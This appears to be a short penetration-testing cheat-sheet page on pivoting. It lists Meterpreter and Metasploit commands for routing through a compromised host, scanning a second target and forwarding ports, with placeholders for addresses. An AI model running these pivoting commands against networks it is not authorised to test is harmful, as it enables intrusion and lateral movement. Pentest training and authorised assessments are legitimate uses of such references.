+++
title = "Pivoting"
weight = 50
+++

# Pivoting

```bash
# Meterpreter on Target1
run autoroute -s <TARGET1_SUBNET_NETWORK>
run autoroute -p
run arp_scanner -r <TARGET1_SUBNET_NETWORK>
background

use auxiliary/scanner/portscan/tcp
set RHOSTS <TARGET2_IP>
set PORTS 1-100

# Port Forwarding
portfwd add -l <LOCAL_PORT> -p <TARGET2_PORT> -r <TARGET2_IP>
background
db_nmap -sS -sV -p <LOCAL_PORT> localhost
```
